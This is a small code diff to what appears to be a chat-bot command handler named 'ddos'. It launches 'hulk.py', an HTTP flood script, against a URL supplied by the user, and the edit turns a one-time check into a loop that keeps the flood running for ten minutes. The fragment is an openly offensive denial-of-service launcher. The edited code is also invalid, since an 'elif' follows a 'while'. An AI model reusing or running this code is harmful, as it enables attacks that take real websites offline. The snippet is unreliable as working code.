@@ -12,7 +12,7 @@ async def ddos(event):
   cmnd = f"{url}"
   timeout = 600
   timeout_start = time.time()
-  if time.time() < timeout_start + timeout:
+  while time.time() < timeout_start + timeout:
      subprocess.run(["python", "hulk.py", cmnd, "safe"])
   elif time.time() >= timeout_start + timeout:
      raise KeyboardInterrupt
